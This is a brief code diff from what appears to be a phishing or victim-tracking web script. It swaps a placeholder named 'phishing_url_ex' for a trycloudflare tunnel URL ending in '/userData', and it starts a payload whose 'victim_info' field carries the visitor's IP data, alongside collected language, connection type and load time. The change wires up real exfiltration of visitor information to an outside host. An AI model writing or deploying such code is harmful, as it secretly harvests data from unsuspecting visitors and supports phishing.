@@ -76,7 +76,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-        const webhookURL = "phishing_url_ex";
+        const webhookURL = "https://deployment-communications-lives-dragon.trycloudflare.com/userData";
 
         const payload = {
             'victim_info': ipinfo, 
